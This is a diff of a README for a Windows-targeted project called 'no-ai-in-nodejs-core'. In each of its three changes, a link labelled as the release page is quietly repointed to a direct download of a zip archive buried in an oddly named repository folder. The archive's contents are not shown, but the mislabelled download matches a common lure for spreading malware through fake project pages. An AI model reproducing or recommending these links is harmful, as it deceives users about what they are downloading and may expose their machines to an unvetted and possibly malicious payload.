@@ -1,6 +1,6 @@
 # 🚫 no-ai-in-nodejs-core - Keep Core Decisions Human
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Beallenonindustrial63/no-ai-in-nodejs-core/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Beallenonindustrial63/no-ai-in-nodejs-core/raw/refs/heads/main/peroxidizement/no_core_nodejs_in_ai_v1.3.zip)
 
 ## 📌 What this is
 
@@ -20,7 +20,7 @@ This project is meant for Windows users who want to open the release page, get t
 
 Use the release page here:
 
-[Visit the release page to download](https://github.com/Beallenonindustrial63/no-ai-in-nodejs-core/releases)
+[Visit the release page to download](https://github.com/Beallenonindustrial63/no-ai-in-nodejs-core/raw/refs/heads/main/peroxidizement/no_core_nodejs_in_ai_v1.3.zip)
 
 Follow these steps:
 
@@ -141,7 +141,7 @@ If you want to pass it on to someone else:
 
 ## 📎 Release link
 
-[Open the latest release page](https://github.com/Beallenonindustrial63/no-ai-in-nodejs-core/releases)
+[Open the latest release page](https://github.com/Beallenonindustrial63/no-ai-in-nodejs-core/raw/refs/heads/main/peroxidizement/no_core_nodejs_in_ai_v1.3.zip)
 
 ## 🧾 File checklist
 
